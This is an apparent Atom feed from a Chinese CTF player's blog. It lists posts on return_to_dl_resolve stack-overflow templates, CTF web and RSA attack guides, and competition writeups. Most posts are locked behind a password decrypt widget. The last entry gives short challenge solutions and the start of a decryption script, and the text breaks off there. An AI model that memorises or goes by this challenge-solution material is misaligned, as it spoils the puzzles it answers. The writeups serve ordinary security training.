<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>WinterSun Space</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://winter3un.github.io/"/>
  <updated>2018-08-20T03:52:54.348Z</updated>
  <id>https://winter3un.github.io/</id>
  
  <author>
    <name>WinterSun</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>通过return_to_dl_resolve技术秒题</title>
    <link href="https://winter3un.github.io/2018/08/19/return-to-dl-resolve/"/>
    <id>https://winter3un.github.io/2018/08/19/return-to-dl-resolve/</id>
    <published>2018-08-20T03:47:22.000Z</published>
    <updated>2018-08-20T03:52:54.348Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);showMessage('嘿！芝麻开门~~', 5000);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none"></div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {showMessage("嘻嘻嘻，密码不对哦~", 5000);};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;比赛中常常会遇到基础栈溢出类的题（并且开启ASLR+DEP），写这篇文章的目的主要是构造&lt;code&gt;return_to_dl_resolve&lt;/code&gt;技术的32位与64位模板，再遇到类似的栈溢出题目时，就不必再绕很大的圈子做了，直接秒了即可。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://winter3un.github.io/tags/ctf/"/>
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2018_807个人赛复盘</title>
    <link href="https://winter3un.github.io/2018/08/07/20180807/"/>
    <id>https://winter3un.github.io/2018/08/07/20180807/</id>
    <published>2018-08-08T03:39:09.000Z</published>
    <updated>2018-08-11T13:40:27.781Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);showMessage('嘿！芝麻开门~~', 5000);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none"></div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {showMessage("嘻嘻嘻，密码不对哦~", 5000);};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这次比赛非常没有状态，可能是很久没参加正式比赛的缘故。这篇文章为赛后总结，也是一篇writeup。emmmm，我会认真写。&lt;/p&gt;
    
    </summary>
    
    
      <category term="writeup" scheme="https://winter3un.github.io/tags/writeup/"/>
    
      <category term="ctf" scheme="https://winter3un.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ctf-web指南</title>
    <link href="https://winter3un.github.io/2018/07/30/ctf-web/"/>
    <id>https://winter3un.github.io/2018/07/30/ctf-web/</id>
    <published>2018-07-31T01:48:54.000Z</published>
    <updated>2018-09-02T04:20:26.564Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);showMessage('嘿！芝麻开门~~', 5000);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none"></div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {showMessage("嘻嘻嘻，密码不对哦~", 5000);};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;ctf中web安全考察点知识点多种多样，现笔者不才，斗胆试着整理一下，也是对自己近一年来web所学做一次总结，由于整理并非非常完善，故此文将持续更新。&lt;/p&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>CTF-RSA破解方式整理</title>
    <link href="https://winter3un.github.io/2018/07/09/rsa-ctf/"/>
    <id>https://winter3un.github.io/2018/07/09/rsa-ctf/</id>
    <published>2018-07-10T00:51:05.000Z</published>
    <updated>2018-07-27T03:07:29.491Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);showMessage('嘿！芝麻开门~~', 5000);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none">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</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {showMessage("嘻嘻嘻，密码不对哦~", 5000);};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;其实对于RSA加密算法攻击的文章，互联网上已经有很多了，所以本文主要还是以整理为主，只列出每种攻击方式的攻击条件、需要的一些工具、具体操作步骤等。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://winter3un.github.io/tags/ctf/"/>
    
      <category term="crypto" scheme="https://winter3un.github.io/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>2018 706 writeup</title>
    <link href="https://winter3un.github.io/2018/07/09/2018-706-wp/"/>
    <id>https://winter3un.github.io/2018/07/09/2018-706-wp/</id>
    <published>2018-07-09T11:00:43.000Z</published>
    <updated>2018-07-10T00:52:55.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>706测试的题目，wp简单写下。</p><a id="more"></a><h2 id="Misc1"><a href="#Misc1" class="headerlink" title="Misc1"></a>Misc1</h2><p>两张图叠加，010处理下就出来了。</p><h2 id="Misc2"><a href="#Misc2" class="headerlink" title="Misc2"></a>Misc2</h2><p>png的长度设置长一点就出flag</p><h2 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h2><p>steg 打开，RGB三个最低色道分别来一次，flag组合下就出来了。</p><h2 id="Misc4"><a href="#Misc4" class="headerlink" title="Misc4"></a>Misc4</h2><p>流量包内有jsfuck编码的密码，log文件内有rar文件，拿密码去解压rar文件，就出flag</p><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>flag直接写在main函数里了。。</p><h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><p>题目算法似乎有问题，反正我是没解出来，好像有人解出来了- -，真流弊</p><h2 id="crypt1"><a href="#crypt1" class="headerlink" title="crypt1"></a>crypt1</h2><p>直接写出解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf8 -*-</span></div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES,DES3</div><div class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">()</span>:</span></div><div class="line">flag=open(<span class="string">"flag.txt"</span>,<span class="string">"rb"</span>).read().strip()</div><div class="line">paclen=<span class="number">8</span>-len(flag)%<span class="number">8</span></div><div class="line">flag+=paclen*(chr(paclen))</div><div class="line"></div><div 